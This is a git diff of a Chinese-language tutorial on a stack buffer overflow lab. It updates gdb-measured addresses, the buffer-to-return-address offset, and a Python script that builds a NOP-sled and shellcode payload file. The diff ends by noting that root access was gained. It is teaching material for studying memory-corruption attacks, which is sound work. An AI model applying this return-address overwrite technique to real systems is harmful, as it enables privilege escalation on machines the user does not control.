@@ -88,19 +88,20 @@ sudo apt install gdb -y
 ![gdb调试1](../img/overflow-gdb1.png)
 ![gdb调试2](../img/overflow-gdb2.png)
 
-  从结果可知，帧指针0xffffd538，返回地址保存在0xffffd538 + 4，第一个NOP指令在0xffffd538 + 8，
-因此可以将0xffffd538 + 8作为恶意代码的入口地址，把它写入返回地址字段中。  
+  从结果可知，帧指针0xbffff528，返回地址保存在0xbffff528 + 4，第一个NOP指令在0xbffff528 + 8，
+因此可以将0xbffff528 + 8作为恶意代码的入口地址，把它写入返回地址字段中。  
   返回地址字段在输入数据中又处于哪个位置？由于输入复制到buffer中，为了让输入中的返回地址字段准确地覆盖栈中的返回
 地址区域，需要知道栈中buffer和返回地址区域之间的距离，这个距离就是返回地址字段在输入数据中的相对位置。  
-  图中得知了buffer的起始地址，ebp到buffer的起始处的距离为556，由于返回地址区域在rbp指向位置上面的4字节处，
-因此返回地址区域到buffer起始处的距离就是560。
+  图中得知了buffer的起始地址，ebp到buffer的起始处的距离为108，由于返回地址区域在ebp指向位置上面的4字节处，
+因此返回地址区域到buffer起始处的距离就是112。
 
 !!! gdb调试命令
 
     b foo在foo函数处设置一个断点  
     run 运行到断点处  
-    p $rbp 打印帧指针，32位程序用p $ebp  
+    p $ebp 打印帧指针，32位程序用p $ebp  
     p/d 表示用十进制打印  
+    next 查看下一个语句  
 
 !!! 64位系统和32位系统区别
 
@@ -137,9 +138,12 @@ content = bytearray(0x90 for i in range(300))
 start = 300 - len(shellcode)
 content[start:] = shellcode
 
-ret = 0xffffd538 + 100
-content[560:564] = (ret).to_bytes(4, byteorder='little')
+ret = 0xbffff528 + 100
+content[112:116] = (ret).to_bytes(4, byteorder='little')
 file = open("badfile", "wb")
 file.write(content)
 file.close()
 ```
+
+![gdb调试3](../img/overflow-gdb3.png)
+成功溢出攻击得到root权限  &#x1F44D;&#x1F44D;&#x1F44D;
